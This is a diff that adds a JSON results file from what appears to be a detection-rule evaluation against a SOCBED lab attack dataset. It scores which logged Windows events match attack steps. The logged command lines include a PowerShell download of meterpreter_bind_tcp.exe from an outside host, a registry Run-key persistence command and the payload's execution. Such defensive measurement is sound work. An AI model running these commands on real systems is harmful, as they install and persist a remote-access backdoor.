@@ -1,0 +1,330 @@
+{
+  "schema": "breachscope.p2_35g_socbed_clock_offset_binding.v1",
+  "analysis_id": "p2-35g-socbed-clock-offset-binding-v1",
+  "status": "completed",
+  "contract_sha256": "9c9bac5337e5cb06a7179c6c03390a5878eae01873f2dcbd25282299ad3c1d11",
+  "runner_sha256": "7b05bbda83ac99de02ef83e083accf69a85814d8da79928066616a48e8570c43",
+  "predecessor_runner_sha256": "6010438daef731096045fa4ebb789d09562d0b0a886e2c3ed98f3f965a57eae5",
+  "product": {
+    "baseline_repo_commit": "3ca80865477cccfa5e967f549acf32d92182eccd",
+    "breachscope_and_rules_match_frozen_commit": true,
+    "rules_tree_sha256": "ac5b6f1db7af2208910e9a7954b414d21c6ef019dfcdf29ddfdd566cd77a9326",
+    "rule_file_count": 5
+  },
+  "source": {
+    "archive_size_bytes": 77984817,
+    "archive_sha256": "7eda65f08bbe6f274c1feff178ae132cfd0e8edbdf0a10ef08321259b6facc54",
+    "selected_windows_member": {
+      "path": "host1_bestpractice/winlogbeat_01.jsonl",
+      "size_bytes": 21081975,
+      "sha256": "d648be6ac0acd18a354e0e1b497800d9d41d2a511afe21308ca3c2a0b679064d"
+    },
+    "timing_anchor_member": {
+      "path": "host1_bestpractice/attackconsole_01.log",
+      "size_bytes": 6536,
+      "sha256": "e843ab909b729709b893fedc4a81c00d8d0336ff745fe05febc52ba00e9668b7"
+    }
+  },
+  "measurement": {
+    "raw_jsonl_rows": 9370,
+    "events": 9369,
+    "findings": 29,
+    "oracle_results": {
+      "misc_sqlmap": {
+        "disposition": "NOT_EVALUATED_NO_SELECTED_WINDOWS_EVENT_ORACLE",
+        "reason": "The pinned source performs SQL injection from the attacker against the DVWA Linux web server; the selected data source is one Windows Winlogbeat member, so absence of a Windows event cannot be treated as a detection miss.\n"
+      },
+      "infect_email_exe": {
+        "disposition": "NOT_EVALUATED_NO_SELECTED_WINDOWS_EVENT_ORACLE",
+        "reason": "The pinned source generates and sends a malicious attachment but does not define recipient-side attachment execution as part of this attack action.\n"
+      },
+      "c2_take_screenshot": {
+        "disposition": "NOT_EVALUATED_NO_DETERMINISTIC_EVENT_ORACLE",
+        "reason": "The pinned source performs a Meterpreter screenshot in an existing C2 session; the pinned collector configuration does not define one deterministic Windows event that is guaranteed to identify this action.\n"
+      },
+      "c2_exfiltration": {
+        "disposition": "NOT_EVALUATED_NO_DETERMINISTIC_EVENT_ORACLE",
+        "reason": "The pinned source collects remote DOC files through Meterpreter; the selected client Winlogbeat member does not provide a predeclared deterministic event identity for this action.\n"
+      },
+      "c2_mimikatz": {
+        "disposition": "NOT_EVALUATED_NO_DETERMINISTIC_EVENT_ORACLE",
+        "reason": "The pinned source loads Meterpreter kiwi and runs creds_all. The pinned Sysmon ProcessAccess section has an empty include, so a credential-access event cannot be assumed as a deterministic oracle.\n"
+      },
+      "misc_download_malware": {
+        "disposition": "EVALUATED_SOURCE_DERIVED_ORACLE",
+        "predicate_id": "DOWNLOAD_POWERSHELL_EXACT_SOURCE_TOKENS_V1",
+        "original_window_start": "2021-06-18T13:03:50.002709+00:00",
+        "corrected_window_start": "2021-06-18T13:03:48.002709+00:00",
+        "window_end": "2021-06-18T13:06:49.371620+00:00",
+        "pre_roll_seconds": 2,
+        "known_posthoc_predicate_match_count": 15,
+        "oracle_event_count": 15,
+        "oracle_event_finding_bound_count": 15,
+        "finding_count_on_oracle_events": 15,
+        "finding_rule_ids_on_oracle_events": [
+          "R-DL"
+        ],
+        "finding_techniques_on_oracle_events": [
+          "T1105"
+        ],
+        "action_observable_in_selected_source": true,
+        "any_finding_bound_to_oracle_event": true,
+        "oracle_events": [
+          {
+            "timestamp": "2021-06-18T13:03:49.640Z",
+            "host": "CLIENT1.breach.local",
+            "source": "PowerShell",
+            "event_id": "600",
+            "event_record_id": "6023",
+            "image": "",
+            "command_line": "powershell -Command Invoke-WebRequest 'http://172.18.1.1/meterpreter_bind_tcp.exe' -OutFile 'C:\\Windows\\meterpreter_bind_tcp.exe'",
+            "target_object": "",
+            "details": ""
+          },
+          {
+            "timestamp": "2021-06-18T13:03:49.641Z",
+            "host": "CLIENT1.breach.local",
+            "source": "PowerShell",
+            "event_id": "600",
+            "event_record_id": "6026",
+            "image": "",
+            "command_line": "powershell -Command Invoke-WebRequest 'http://172.18.1.1/meterpreter_bind_tcp.exe' -OutFile 'C:\\Windows\\meterpreter_bind_tcp.exe'",
+            "target_object": "",
+            "details": ""
+          },
+          {
+            "timestamp": "2021-06-18T13:03:49.642Z",
+            "host": "CLIENT1.breach.local",
+            "source": "PowerShell",
+            "event_id": "400",
+            "event_record_id": "6027",
+            "image": "",
+            "command_line": "powershell -Command Invoke-WebRequest 'http://172.18.1.1/meterpreter_bind_tcp.exe' -OutFile 'C:\\Windows\\meterpreter_bind_tcp.exe'",
+            "target_object": "",
+            "details": ""
+          },
+          {
+            "timestamp": "2021-06-18T13:03:50.027Z",
+            "host": "CLIENT1.breach.local",
+            "source": "PowerShell",
+            "event_id": "800",
+            "event_record_id": "6029",
+            "image": "",
+            "command_line": "powershell -Command Invoke-WebRequest 'http://172.18.1.1/meterpreter_bind_tcp.exe' -OutFile 'C:\\Windows\\meterpreter_bind_tcp.exe'",
+            "target_object": "",
+            "details": ""
+          },
+          {
+            "timestamp": "2021-06-18T13:03:50.027Z",
+            "host": "CLIENT1.breach.local",
+            "source": "PowerShell",
+            "event_id": "403",
+            "event_record_id": "6030",
+            "image": "",
+            "command_line": "powershell -Command Invoke-WebRequest 'http://172.18.1.1/meterpreter_bind_tcp.exe' -OutFile 'C:\\Windows\\meterpreter_bind_tcp.exe'",
+            "target_object": "",
+            "details": ""
+          },
+          {
+            "timestamp": "2021-06-18T13:03:49.378Z",
+            "host": "CLIENT1.breach.local",
+            "source": "Microsoft-Windows-Sysmon",
+            "event_id": "1",
+            "event_record_id": "1918",
+            "image": "",
+            "command_line": "\"c:\\windows\\system32\\cmd.exe\" /c \"cmd /C powershell -Command \"Invoke-WebRequest 'http://172.18.1.1/meterpreter_bind_tcp.exe' -OutFile 'C:\\Windows\\meterpreter_bind_tcp.exe'\" && echo File downloaded successfully.\"",
+            "target_object": "",
+            "details": ""
+          },
+          {
+            "timestamp": "2021-06-18T13:03:49.640Z",
+            "host": "CLIENT1.breach.local",
+            "source": "PowerShell",
+            "event_id": "600",
+            "event_record_id": "6022",
+            "image": "",
+            "command_line": "powershell -Command Invoke-WebRequest 'http://172.18.1.1/meterpreter_bind_tcp.exe' -OutFile 'C:\\Windows\\meterpreter_bind_tcp.exe'",
+            "target_object": "",
+            "details": ""
+          },
+          {
+            "timestamp": "2021-06-18T13:03:50.034Z",
+            "host": "CLIENT1.breach.local",
+            "source": "Microsoft-Windows-PowerShell",
+            "event_id": "4103",
+            "event_record_id": "5525",
+            "image": "",
+            "command_line": "powershell -Command Invoke-WebRequest 'http://172.18.1.1/meterpreter_bind_tcp.exe' -OutFile 'C:\\Windows\\meterpreter_bind_tcp.exe'",
+            "target_object": "",
+            "details": ""
+          },
+          {
+            "timestamp": "2021-06-18T13:03:50.035Z",
+            "host": "CLIENT1.breach.local",
+            "source": "Microsoft-Windows-PowerShell",
+            "event_id": "4103",
+            "event_record_id": "5526",
+            "image": "",
+            "command_line": "powershell -Command Invoke-WebRequest 'http://172.18.1.1/meterpreter_bind_tcp.exe' -OutFile 'C:\\Windows\\meterpreter_bind_tcp.exe'",
+            "target_object": "",
+            "details": ""
+          },
+          {
+            "timestamp": "2021-06-18T13:03:49.639Z",
+            "host": "CLIENT1.breach.local",
+            "source": "PowerShell",
+            "event_id": "600",
+            "event_record_id": "6021",
+            "image": "",
+            "command_line": "powershell -Command Invoke-WebRequest 'http://172.18.1.1/meterpreter_bind_tcp.exe' -OutFile 'C:\\Windows\\meterpreter_bind_tcp.exe'",
+            "target_object": "",
+            "details": ""
+          },
+          {
+            "timestamp": "2021-06-18T13:03:49.640Z",
+            "host": "CLIENT1.breach.local",
+            "source": "PowerShell",
+            "event_id": "600",
+            "event_record_id": "6024",
+            "image": "",
+            "command_line": "powershell -Command Invoke-WebRequest 'http://172.18.1.1/meterpreter_bind_tcp.exe' -OutFile 'C:\\Windows\\meterpreter_bind_tcp.exe'",
+            "target_object": "",
+            "details": ""
+          },
+          {
+            "timestamp": "2021-06-18T13:03:49.640Z",
+            "host": "CLIENT1.breach.local",
+            "source": "PowerShell",
+            "event_id": "600",
+            "event_record_id": "6025",
+            "image": "",
+            "command_line": "powershell -Command Invoke-WebRequest 'http://172.18.1.1/meterpreter_bind_tcp.exe' -OutFile 'C:\\Windows\\meterpreter_bind_tcp.exe'",
+            "target_object": "",
+            "details": ""
+          },
+          {
+            "timestamp": "2021-06-18T13:03:50.027Z",
+            "host": "CLIENT1.breach.local",
+            "source": "PowerShell",
+            "event_id": "800",
+            "event_record_id": "6028",
+            "image": "",
+            "command_line": "powershell -Command Invoke-WebRequest 'http://172.18.1.1/meterpreter_bind_tcp.exe' -OutFile 'C:\\Windows\\meterpreter_bind_tcp.exe'",
+            "target_object": "",
+            "details": ""
+          },
+          {
+            "timestamp": "2021-06-18T13:03:49.385Z",
+            "host": "CLIENT1.breach.local",
+            "source": "Microsoft-Windows-Sysmon",
+            "event_id": "1",
+            "event_record_id": "1919",
+            "image": "",
+            "command_line": "cmd  /C powershell -Command \"Invoke-WebRequest 'http://172.18.1.1/meterpreter_bind_tcp.exe' -OutFile 'C:\\Windows\\meterpreter_bind_tcp.exe'\"",
+            "target_object": "",
+            "details": ""
+          },
+          {
+            "timestamp": "2021-06-18T13:03:49.390Z",
+            "host": "CLIENT1.breach.local",
+            "source": "Microsoft-Windows-Sysmon",
+            "event_id": "1",
+            "event_record_id": "1920",
+            "image": "",
+            "command_line": "powershell  -Command \"Invoke-WebRequest 'http://172.18.1.1/meterpreter_bind_tcp.exe' -OutFile 'C:\\Windows\\meterpreter_bind_tcp.exe'\"",
+            "target_object": "",
+            "details": ""
+          }
+        ]
+      },
+      "misc_set_autostart": {
+        "disposition": "EVALUATED_SOURCE_DERIVED_ORACLE",
+        "predicate_id": "AUTOSTART_RUN_KEY_EXACT_SOURCE_TOKENS_V1",
+        "original_window_start": "2021-06-18T13:06:49.371620+00:00",
+        "corrected_window_start": "2021-06-18T13:06:47.371620+00:00",
+        "window_end": "2021-06-18T13:09:49.371620+00:00",
+        "pre_roll_seconds": 2,
+        "known_posthoc_predicate_match_count": 2,
+        "oracle_event_count": 2,
+        "oracle_event_finding_bound_count": 0,
+        "finding_count_on_oracle_events": 0,
+        "finding_rule_ids_on_oracle_events": [],
+        "finding_techniques_on_oracle_events": [],
+        "action_observable_in_selected_source": true,
+        "any_finding_bound_to_oracle_event": false,
+        "oracle_events": [
+          {
+            "timestamp": "2021-06-18T13:06:48.551Z",
+            "host": "CLIENT1.breach.local",
+            "source": "Microsoft-Windows-Sysmon",
+            "event_id": "1",
+            "event_record_id": "1968",
+            "image": "",
+            "command_line": "\"c:\\windows\\system32\\cmd.exe\" /c \"REG ADD HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v \"Meterpreter Bind TCP\" /t REG_SZ /d \"meterpreter_bind_tcp.exe\" /f\"",
+            "target_object": "",
+            "details": ""
+          },
+          {
+            "timestamp": "2021-06-18T13:06:48.592Z",
+            "host": "CLIENT1.breach.local",
+            "source": "Microsoft-Windows-Sysmon",
+            "event_id": "13",
+            "event_record_id": "1970",
+            "image": "",
+            "command_line": "",
+            "target_object": "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\Meterpreter Bind TCP",
+            "details": "meterpreter_bind_tcp.exe"
+          }
+        ]
+      },
+      "misc_execute_malware": {
+        "disposition": "EVALUATED_SOURCE_DERIVED_ORACLE",
+        "predicate_id": "PROCESS_CREATE_EXACT_NORMALIZED_COMMAND_V2",
+        "original_window_start": "2021-06-18T13:09:49.890303+00:00",
+        "corrected_window_start": "2021-06-18T13:09:47.890303+00:00",
+        "window_end": "2021-06-18T13:12:49.890303+00:00",
+        "pre_roll_seconds": 2,
+        "known_posthoc_predicate_match_count": 1,
+        "oracle_event_count": 1,
+        "oracle_event_finding_bound_count": 0,
+        "finding_count_on_oracle_events": 0,
+        "finding_rule_ids_on_oracle_events": [],
+        "finding_techniques_on_oracle_events": [],
+        "action_observable_in_selected_source": true,
+        "any_finding_bound_to_oracle_event": false,
+        "oracle_events": [
+          {
+            "timestamp": "2021-06-18T13:09:49.103Z",
+            "host": "CLIENT1.breach.local",
+            "source": "Microsoft-Windows-Sysmon",
+            "event_id": "1",
+            "event_record_id": "2008",
+            "image": "",
+            "command_line": "\"C:\\Windows\\meterpreter_bind_tcp.exe\"",
+            "target_object": "",
+            "details": ""
+          }
+        ]
+      }
+    },
+    "evaluated_action_count": 3,
+    "actions_with_oracle_telemetry": 3,
+    "actions_with_findings_bound_to_oracle_events": 1,
+    "oracle_event_count": 18,
+    "oracle_events_with_findings": 15
+  },
+  "claim_boundary": {
+    "evaluated_actions": "THREE_POSTHOC_KNOWN_WINDOWS_EVENT_SETS_ONLY",
+    "telemetry_predicate_match_counts": "KNOWN_POSTHOC_BEFORE_CONTRACT",
+    "source_derived_oracle_event_binding": "MEASURED_FOR_POSTHOC_KNOWN_EVENT_SET",
+    "pre_roll_seconds": "POSTHOC_FIXED_2_SECONDS",
+    "attack_level_precision": "NOT_EVALUATED",
+    "attack_level_recall": "NOT_EVALUATED",
+    "event_level_precision": "NOT_EVALUATED",
+    "event_level_recall": "NOT_EVALUATED",
+    "eight_attack_recall": "NOT_EVALUATED",
+    "independent_holdout_performance": "NOT_EVALUATED",
+    "general_detection_accuracy": "NOT_CLAIMED",
+    "statistical_benchmark": false
+  }
+}
